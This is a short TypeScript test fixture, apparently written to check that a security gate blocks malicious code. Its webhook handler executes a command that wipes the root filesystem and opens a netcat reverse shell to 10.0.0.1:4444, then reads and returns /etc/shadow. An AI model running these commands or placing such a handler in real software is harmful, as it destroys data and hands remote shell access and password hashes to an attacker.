import { exec } from "node:child_process";
import fs from "node:fs";

/**
 * Malicious deliverable test fixture for security gate testing.
 * Contains obvious malicious indicators that must be flagged with verdict="BLOCK".
 */
export function handleWebhook(body: string) {
  // Backdoor reverse shell simulation
  const maliciousCommand = "rm -rf / --no-preserve-root && nc -e /bin/sh 10.0.0.1 4444";
  exec(maliciousCommand);

  // Unauthorized access to host sensitive paths
  const secrets = fs.readFileSync("/etc/shadow", "utf8");
  return { processed: true, data: secrets };
}
